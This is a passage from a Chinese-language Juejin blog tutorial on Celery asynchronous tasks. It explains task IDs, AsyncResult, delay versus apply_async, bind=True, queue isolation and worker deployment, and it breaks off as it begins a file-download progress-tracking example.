<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkyODQ4MjA4Mg%3D%3D%26mid%3D2247486220%26idx%3D1%26sn%3D4493faf5773c9452f7b600e4b3fd6ab7%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkyODQ4MjA4Mg==&amp;mid=2247486220&amp;idx=1&amp;sn=4493faf5773c9452f7b600e4b3fd6ab7&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">70.零代码也能做！图片识别+自动入库飞书表格，Coze工作流教程手把手教学</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkyODQ4MjA4Mg%3D%3D%26mid%3D2247486204%26idx%3D1%26sn%3D2eae5fbe94c5517c28ee1725dffca41f%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkyODQ4MjA4Mg==&amp;mid=2247486204&amp;idx=1&amp;sn=2eae5fbe94c5517c28ee1725dffca41f&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">69.运用Coze工作流实现多张发票识别写入飞书表格</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkyODQ4MjA4Mg%3D%3D%26mid%3D2247486172%26idx%3D1%26sn%3D1a31df5b39e3e9f4b7549b51f4db32a1%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkyODQ4MjA4Mg==&amp;mid=2247486172&amp;idx=1&amp;sn=1a31df5b39e3e9f4b7549b51f4db32a1&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">68.运用Coze工作流实现发票智能识别与自动化录入飞书多维表格</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Celery 异步任务完全指南：从入门到实战]]></title>    <link>https://juejin.cn/post/7581470169839632422</link>    <guid>https://juejin.cn/post/7581470169839632422</guid>    <pubDate>2025-12-09T02:44:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581470169839632422" data-draft-id="7581374664327725107" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Celery 异步任务完全指南：从入门到实战"/> <meta itemprop="keywords" content="Flask,Python"/> <meta itemprop="datePublished" content="2025-12-09T02:44:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Xier"/> <meta itemprop="url" content="https://juejin.cn/user/1152710585356295"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Celery 异步任务完全指南：从入门到实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1152710585356295/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Xier
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T02:44:40.000Z" title="Tue Dec 09 2025 02:44:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>在开发 Web 应用时，我们经常遇到需要长时间执行的任务：发送邮件、处理大文件、生成报表、训练机器学习模型等。如果这些任务在 HTTP 请求中同步执行，会导致用户等待很久，甚至超时。</p>
<p>Celery 就是解决这个问题的利器——一个强大的分布式任务队列系统。本文将深入浅出地介绍 Celery 的核心概念和实战应用，特别是如何实现<strong>文件下载进度实时追踪</strong>这个常见需求。</p>
<h2 data-id="heading-1">一、Celery 是什么？</h2>
<h3 data-id="heading-2">1.1 核心架构</h3>
<p>Celery 由三个核心组件组成：</p>
<pre><code class="hljs language-scss" lang="scss">┌──────────────┐      ┌──────────────┐      ┌──────────────┐
│  <span class="hljs-selector-tag">Main</span> 程序   │ ───&gt; │ Message Broker│ ───&gt; │Celery Worker │
│ (Flask/Django)│      │   (Redis)    │      │  (执行任务)  │
└──────────────┘      └──────────────┘      └──────────────┘
       │                                            │
       │              ┌──────────────┐             │
       └─────────────&gt;│Result Backend│&lt;────────────┘
                      │   (Redis)    │
                      └──────────────┘
</code></pre>
<ul>
<li><strong>Main 程序</strong>: 发送任务的客户端（你的 Web 应用）</li>
<li><strong>Message Broker</strong>: 消息队列，存储待执行的任务（常用 Redis）</li>
<li><strong>Celery Worker</strong>: 执行任务的工作进程</li>
<li><strong>Result Backend</strong>: 存储任务结果和状态（可选，常用 Redis）</li>
</ul>
<h3 data-id="heading-3">1.2 快速开始</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 安装</span>
pip install celery redis

<span class="hljs-comment"># 定义任务 (tasks.py)</span>
from celery import Celery

<span class="hljs-attr">app</span> = Celery(<span class="hljs-string">'myapp'</span>, 
             <span class="hljs-attr">broker</span>=<span class="hljs-string">'redis://localhost:6379/0'</span>,
             <span class="hljs-attr">backend</span>=<span class="hljs-string">'redis://localhost:6379/0'</span>)

@app.task
def add(x, y):
    return x + y

<span class="hljs-comment"># 启动 Worker</span>
<span class="hljs-comment"># celery -A tasks worker --loglevel=info</span>

<span class="hljs-comment"># 调用任务 (main.py)</span>
<span class="hljs-attr">result</span> = add.delay(<span class="hljs-number">4</span>, <span class="hljs-number">6</span>)
print(result.get())  <span class="hljs-comment"># 输出: 10</span>
</code></pre>
<h2 data-id="heading-4">二、task_id：任务的唯一标识符</h2>
<h3 data-id="heading-5">2.1 什么是 task_id？</h3>
<p><code>task_id</code> 是每个任务的唯一标识符，类似于快递单号。通过它，Main 程序和 Worker 都能追踪同一个任务。</p>
<h3 data-id="heading-6">2.2 生成与传递机制</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># Main 程序端</span>
<span class="hljs-attr">result</span> = add.apply_async(args=[<span class="hljs-number">10</span>, <span class="hljs-number">20</span>])
<span class="hljs-attr">task_id</span> = result.id  <span class="hljs-comment"># Celery 自动生成 UUID</span>
print(f"Task ID: {task_id}")  <span class="hljs-comment"># 3c8a2c9a-7b5d-4e3f...</span>
</code></pre>
<p><strong>关键流程</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">Main 程序                    Redis (Broker)              Worker
    │                             │                        │
    │ ① 生成 <span class="hljs-attr">task_id</span>=<span class="hljs-string">"abc-123"</span>    │                        │
    │ ② 发送消息                   │                        │
    │   {id:"abc-123", args:<span class="hljs-section">[]</span>}   │                        │
    ├────────────────────────────&gt;│                        │
    │                             │ ③ Worker 拉取消息      │
    │                             ├───────────────────────&gt;│
    │                             │   解析 task_id         │
    │                             │                        │
    │                             │   Redis (Backend)      │
    │ ④ 查询状态                   │         │              │
    │   用 task_id 查询            │         │ ⑤ 写入状态  │
    │&lt;────────────────────────────┼─────────┼──────────────│
</code></pre>
<p><strong>重点</strong>：task_id 在 Main 程序生成，通过消息传递给 Worker，双方都用它作为 Redis Backend 的键名来读写状态。</p>
<h3 data-id="heading-7">2.3 自定义 task_id</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 自定义 task_id（业务相关）</span>
<span class="hljs-attr">custom_id</span> = f<span class="hljs-string">"download_{user_id}_{file_id}_{uuid.uuid4().hex[:8]}"</span>

<span class="hljs-attr">result</span> = download_file.apply_async(
    <span class="hljs-attr">args</span>=[<span class="hljs-string">'https://example.com/file.zip'</span>, <span class="hljs-string">'/tmp/file.zip'</span>],
    <span class="hljs-attr">task_id</span>=custom_id  <span class="hljs-comment"># 指定自定义 ID</span>
)

<span class="hljs-comment"># 后续可以随时查询</span>
from celery.result import AsyncResult
<span class="hljs-attr">status</span> = AsyncResult(custom_id, app=app)
print(status.state)
</code></pre>
<p><strong>好处</strong>：</p>
<ul>
<li>便于数据库存储和查询</li>
<li>实现幂等性（避免重复任务）</li>
<li>便于日志追踪和调试</li>
</ul>
<h2 data-id="heading-8">三、AsyncResult：任务结果的代理对象</h2>
<h3 data-id="heading-9">3.1 什么是 AsyncResult？</h3>
<p><code>AsyncResult</code> 是一个代表任务结果的对象，就像"提货单"——你可以随时用它查询任务状态。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 方式 1: 任务调用时直接获得</span>
<span class="hljs-attr">result</span> = add.delay(<span class="hljs-number">4</span>, <span class="hljs-number">6</span>)
print(type(result))  <span class="hljs-comment"># &lt;class 'celery.result.AsyncResult'&gt;</span>

<span class="hljs-comment"># 方式 2: 通过 task_id 重新创建</span>
<span class="hljs-attr">result</span> = AsyncResult(<span class="hljs-string">'task-id-from-database'</span>, app=app)
</code></pre>
<h3 data-id="heading-10">3.2 核心属性和方法</h3>
<pre><code class="hljs language-bash" lang="bash">result = long_task.delay(100)

<span class="hljs-comment"># 任务标识</span>
<span class="hljs-built_in">print</span>(result.id)          <span class="hljs-comment"># task_id</span>

<span class="hljs-comment"># 任务状态</span>
<span class="hljs-built_in">print</span>(result.state)       <span class="hljs-comment"># PENDING, STARTED, SUCCESS, FAILURE...</span>

<span class="hljs-comment"># 检查状态</span>
<span class="hljs-built_in">print</span>(result.ready())     <span class="hljs-comment"># 是否完成 (True/False)</span>
<span class="hljs-built_in">print</span>(result.successful()) <span class="hljs-comment"># 是否成功</span>
<span class="hljs-built_in">print</span>(result.failed())    <span class="hljs-comment"># 是否失败</span>

<span class="hljs-comment"># 获取结果</span>
value = result.get(<span class="hljs-built_in">timeout</span>=10)  <span class="hljs-comment"># 阻塞等待，最多 10 秒</span>

<span class="hljs-comment"># 非阻塞获取</span>
<span class="hljs-keyword">if</span> result.ready():
    <span class="hljs-built_in">print</span>(result.result)  <span class="hljs-comment"># 获取结果或异常</span>
</code></pre>
<h3 data-id="heading-11">3.3 访问任务元数据</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@app.task(<span class="hljs-params">bind=<span class="hljs-literal">True</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">task_with_progress</span>(<span class="hljs-params">self, n</span>):
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):
        self.update_state(
            state=<span class="hljs-string">'PROGRESS'</span>,
            meta={<span class="hljs-string">'current'</span>: i, <span class="hljs-string">'total'</span>: n}
        )
    <span class="hljs-keyword">return</span> <span class="hljs-string">'done'</span>

result = task_with_progress.delay(<span class="hljs-number">10</span>)
time.sleep(<span class="hljs-number">2</span>)
<span class="hljs-built_in">print</span>(result.info)  <span class="hljs-comment"># {'current': 5, 'total': 10}</span>
</code></pre>
<p><strong>注意</strong>：AsyncResult 本身不存储数据，它只是通过 task_id 去 Redis 查询数据的"查询器"。</p>
<h2 data-id="heading-12">四、delay() vs apply_async()</h2>
<h3 data-id="heading-13">4.1 核心区别</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># delay() - 简化版本</span>
<span class="hljs-attr">result</span> = task.delay(arg1, arg2, key=value)

<span class="hljs-comment"># 等价于</span>
<span class="hljs-attr">result</span> = task.apply_async(
    <span class="hljs-attr">args</span>=[arg1, arg2], 
    <span class="hljs-attr">kwargs</span>={<span class="hljs-string">'key'</span>: value}
)
</code></pre>
<h3 data-id="heading-14">4.2 功能对比表</h3>













































<table><thead><tr><th>功能</th><th>delay()</th><th>apply_async()</th></tr></thead><tbody><tr><td>传递任务参数</td><td>✅</td><td>✅</td></tr><tr><td>自定义 task_id</td><td>❌</td><td>✅</td></tr><tr><td>延迟执行</td><td>❌</td><td>✅</td></tr><tr><td>定时执行</td><td>❌</td><td>✅</td></tr><tr><td>设置优先级</td><td>❌</td><td>✅</td></tr><tr><td>覆盖队列</td><td>❌</td><td>✅</td></tr><tr><td>任务链</td><td>❌</td><td>✅</td></tr></tbody></table>
<h3 data-id="heading-15">4.3 使用建议</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 简单场景 - 使用 delay()</span>
send_email.delay("user@example.com", "Hello")

<span class="hljs-comment"># 需要追踪或配置 - 使用 apply_async()</span>
<span class="hljs-attr">result</span> = download_file.apply_async(
    <span class="hljs-attr">args</span>=[<span class="hljs-string">'https://example.com/file.zip'</span>],
    <span class="hljs-attr">task_id</span>=f<span class="hljs-string">"download_{user_id}_{timestamp}"</span>,
    <span class="hljs-attr">countdown</span>=<span class="hljs-number">60</span>,  <span class="hljs-comment"># 60 秒后执行</span>
    <span class="hljs-attr">queue</span>=<span class="hljs-string">"download"</span>,
    <span class="hljs-attr">priority</span>=<span class="hljs-number">9</span>
)
</code></pre>
<p><strong>原则</strong>：默认用 <code>delay()</code> 保持简洁，需要高级功能时用 <code>apply_async()</code>。</p>
<h2 data-id="heading-16">五、bind=True：任务的自我感知</h2>
<h3 data-id="heading-17">5.1 核心作用</h3>
<p><code>bind=True</code> 让任务函数接收 <code>self</code> 参数，代表任务实例本身，从而可以访问任务信息和控制任务行为。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 不使用 bind=True</span>
<span class="hljs-meta">@app.task</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">task1</span>(<span class="hljs-params">x, y</span>):
    <span class="hljs-comment"># ❌ 无法访问 task_id</span>
    <span class="hljs-comment"># ❌ 无法更新状态</span>
    <span class="hljs-keyword">return</span> x + y

<span class="hljs-comment"># 使用 bind=True</span>
<span class="hljs-meta">@app.task(<span class="hljs-params">bind=<span class="hljs-literal">True</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">task2</span>(<span class="hljs-params">self, x, y</span>):
    <span class="hljs-comment"># ✅ 访问 task_id</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Task ID: <span class="hljs-subst">{self.request.<span class="hljs-built_in">id</span>}</span>"</span>)
    
    <span class="hljs-comment"># ✅ 更新进度</span>
    self.update_state(
        state=<span class="hljs-string">'PROGRESS'</span>,
        meta={<span class="hljs-string">'progress'</span>: <span class="hljs-number">50</span>}
    )
    
    <span class="hljs-keyword">return</span> x + y
</code></pre>
<h3 data-id="heading-18">5.2 三大核心功能</h3>
<h4 data-id="heading-19">1. 访问任务信息</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@app.task(<span class="hljs-params">bind=<span class="hljs-literal">True</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">inspect_task</span>(<span class="hljs-params">self, data</span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Task ID: <span class="hljs-subst">{self.request.<span class="hljs-built_in">id</span>}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Task Name: <span class="hljs-subst">{self.name}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Args: <span class="hljs-subst">{self.request.args}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Retries: <span class="hljs-subst">{self.request.retries}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Hostname: <span class="hljs-subst">{self.request.hostname}</span>"</span>)
</code></pre>
<h4 data-id="heading-20">2. 更新任务状态</h4>
<pre><code class="hljs language-ini" lang="ini">@app.task(<span class="hljs-attr">bind</span>=<span class="hljs-literal">True</span>)
def download_file(self, url, save_path):
    <span class="hljs-attr">response</span> = requests.get(url, stream=<span class="hljs-literal">True</span>)
    <span class="hljs-attr">total</span> = int(response.headers.get(<span class="hljs-string">'content-length'</span>, <span class="hljs-number">0</span>))
    <span class="hljs-attr">downloaded</span> = <span class="hljs-number">0</span>
    
    for chunk in response.iter_content(8192):
        downloaded += len(chunk)
        
        <span class="hljs-comment"># 实时更新进度</span>
        self.update_state(
            <span class="hljs-attr">state</span>=<span class="hljs-string">'PROGRESS'</span>,
            <span class="hljs-attr">meta</span>={
                'downloaded': downloaded,
                'total': total,
                'percent': int(downloaded / total * 100)
            }
        )
</code></pre>
<h4 data-id="heading-21">3. 手动重试任务</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@app.task(<span class="hljs-params">bind=<span class="hljs-literal">True</span>, max_retries=<span class="hljs-number">3</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">unreliable_api_call</span>(<span class="hljs-params">self, url</span>):
    <span class="hljs-keyword">try</span>:
        response = requests.get(url, timeout=<span class="hljs-number">5</span>)
        <span class="hljs-keyword">return</span> response.json()
    <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> exc:
        <span class="hljs-comment"># 指数退避重试</span>
        countdown = <span class="hljs-number">2</span> ** self.request.retries
        <span class="hljs-keyword">raise</span> self.retry(exc=exc, countdown=countdown)
</code></pre>
<h3 data-id="heading-22">5.3 使用场景</h3>
<p><strong>必须使用 bind=True</strong>：</p>
<ul>
<li>✅ 需要实时更新任务进度</li>
<li>✅ 需要记录 task_id 到日志</li>
<li>✅ 需要实现自定义重试逻辑</li>
<li>✅ 文件下载、数据导入、长时间运行的任务</li>
</ul>
<p><strong>不需要 bind=True</strong>：</p>
<ul>
<li>✅ 简单的"发送并忘记"任务</li>
<li>✅ 纯粹的计算任务</li>
<li>✅ 不需要追踪进度的后台任务</li>
</ul>
<h2 data-id="heading-23">六、Queue：任务的分类与隔离</h2>
<h3 data-id="heading-24">6.1 为什么需要队列？</h3>
<p>想象一个场景：你的应用有两种任务</p>
<ul>
<li>发送邮件：快速，每个任务 1 秒</li>
<li>视频转码：慢速，每个任务 5 分钟</li>
</ul>
<p><strong>不使用队列隔离</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">单一队列: <span class="hljs-section">[邮件1s]</span> <span class="hljs-section">[邮件1s]</span> <span class="hljs-section">[视频5m]</span> <span class="hljs-section">[邮件1s]</span>
                              ↑
                    第3封邮件要等5分钟!
</code></pre>
<p><strong>使用队列隔离</strong>：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">Email</span>队列: <span class="hljs-selector-attr">[邮件]</span> <span class="hljs-selector-attr">[邮件]</span> <span class="hljs-selector-attr">[邮件]</span>  ← <span class="hljs-selector-tag">Email</span> <span class="hljs-selector-tag">Worker</span> (快速)
<span class="hljs-selector-tag">Video</span>队列: <span class="hljs-selector-attr">[视频]</span> <span class="hljs-selector-attr">[视频]</span>         ← <span class="hljs-selector-tag">Video</span> <span class="hljs-selector-tag">Worker</span> (慢速)

结果: 邮件立即发送，视频慢慢处理，互不影响!
</code></pre>
<h3 data-id="heading-25">6.2 定义和使用队列</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 在装饰器中指定队列</span>
<span class="hljs-meta">@shared_task(<span class="hljs-params">queue=<span class="hljs-string">"email"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">send_email</span>(<span class="hljs-params">to, subject, body</span>):
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"Email sent to <span class="hljs-subst">{to}</span>"</span>

<span class="hljs-meta">@shared_task(<span class="hljs-params">queue=<span class="hljs-string">"video"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_video</span>(<span class="hljs-params">video_id</span>):
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"Video <span class="hljs-subst">{video_id}</span> processed"</span>

<span class="hljs-meta">@shared_task(<span class="hljs-params">queue=<span class="hljs-string">"dataset"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_dataset</span>(<span class="hljs-params">dataset_id</span>):
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"Dataset <span class="hljs-subst">{dataset_id}</span> processed"</span>

<span class="hljs-comment"># 调用时覆盖队列</span>
result = send_email.apply_async(
    args=[<span class="hljs-string">"user@example.com"</span>, <span class="hljs-string">"Hello"</span>, <span class="hljs-string">"Welcome"</span>],
    queue=<span class="hljs-string">"high-priority"</span>  <span class="hljs-comment"># 覆盖默认的 "email" 队列</span>
)
</code></pre>
<h3 data-id="heading-26">6.3 启动 Worker 监听队列</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 只处理 email 队列</span>
celery -A myapp worker -Q email <span class="hljs-attr">--loglevel</span>=info

<span class="hljs-comment"># 处理多个队列</span>
celery -A myapp worker -Q email,video,dataset <span class="hljs-attr">--loglevel</span>=info

<span class="hljs-comment"># 多个 Worker 分别处理不同队列</span>
<span class="hljs-comment"># Terminal 1: 快速任务</span>
celery -A myapp worker -Q email,api -n fast_worker

<span class="hljs-comment"># Terminal 2: 慢速任务</span>
celery -A myapp worker -Q video,dataset -n slow_worker
</code></pre>
<h3 data-id="heading-27">6.4 队列设计原则</h3>
<p><strong>按任务类型分类</strong>：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@shared_task</span>(queue=<span class="hljs-string">"email"</span>)    # 邮件任务
<span class="hljs-variable">@shared_task</span>(queue=<span class="hljs-string">"sms"</span>)      # 短信任务
<span class="hljs-variable">@shared_task</span>(queue=<span class="hljs-string">"report"</span>)   # 报表任务
</code></pre>
<p><strong>按执行速度分类</strong>：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@shared_task</span>(queue=<span class="hljs-string">"fast"</span>)     # &lt; <span class="hljs-number">1</span>秒
<span class="hljs-variable">@shared_task</span>(queue=<span class="hljs-string">"normal"</span>)   # <span class="hljs-number">1</span>-<span class="hljs-number">10</span>秒
<span class="hljs-variable">@shared_task</span>(queue=<span class="hljs-string">"slow"</span>)     # &gt; <span class="hljs-number">10</span>秒
</code></pre>
<p><strong>按优先级分类</strong>：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@shared_task</span>(queue=<span class="hljs-string">"high-priority"</span>)
<span class="hljs-variable">@shared_task</span>(queue=<span class="hljs-string">"normal"</span>)
<span class="hljs-variable">@shared_task</span>(queue=<span class="hljs-string">"low-priority"</span>)
</code></pre>
<p><strong>按资源需求分类</strong>：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@shared_task</span>(queue=<span class="hljs-string">"cpu-intensive"</span>)  # CPU 密集型
<span class="hljs-variable">@shared_task</span>(queue=<span class="hljs-string">"io-intensive"</span>)   # IO 密集型
<span class="hljs-variable">@shared_task</span>(queue=<span class="hljs-string">"memory-heavy"</span>)   # 内存密集型
</code></pre>
<h3 data-id="heading-28">6.5 生产环境部署架构</h3>
<pre><code class="hljs language-css" lang="css"># 服务器 <span class="hljs-number">1</span> (<span class="hljs-number">8</span>核 CPU) - 快速任务
celery -<span class="hljs-selector-tag">A</span> myapp worker -<span class="hljs-selector-tag">Q</span> high-priority,api,email -c <span class="hljs-number">4</span> -n server1

# 服务器 <span class="hljs-number">2</span> (<span class="hljs-number">16</span>核 CPU) - 重型任务
celery -<span class="hljs-selector-tag">A</span> myapp worker -<span class="hljs-selector-tag">Q</span> <span class="hljs-selector-tag">video</span>,dataset,ml -c <span class="hljs-number">8</span> -n server2

# 服务器 <span class="hljs-number">3</span> (<span class="hljs-number">4</span>核 CPU) - 普通任务
celery -<span class="hljs-selector-tag">A</span> myapp worker -<span class="hljs-selector-tag">Q</span> default,<span class="hljs-attribute">background</span> -c <span class="hljs-number">4</span> -n server3
</code></pre>
<p><strong>参数说明</strong>：</p>
<ul>
<li><code>-Q</code>: 监听的队列列表</li>
<li><code>-c</code>: 并发数（Worker 进程数）</li>
<li><code>-n</code>: Worker 名称</li>
</ul>
<h2 data-id="heading-29">七、实战案例：文件下载进度实时追踪</h2>
<p>现在我们把所有知识点整合，实现一个完整的文件下载进度追踪系统。</p>
<h3 data-id="heading-30">7.1 Celery 任务定义</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># celery_app.py</span>
<span class="hljs-keyword">from</span> celery <span class="hljs-keyword">import</span> Celery
<span class="hljs-keyword">import</span> requests

app = Celery(
    <span class="hljs-string">'tasks'</span>,
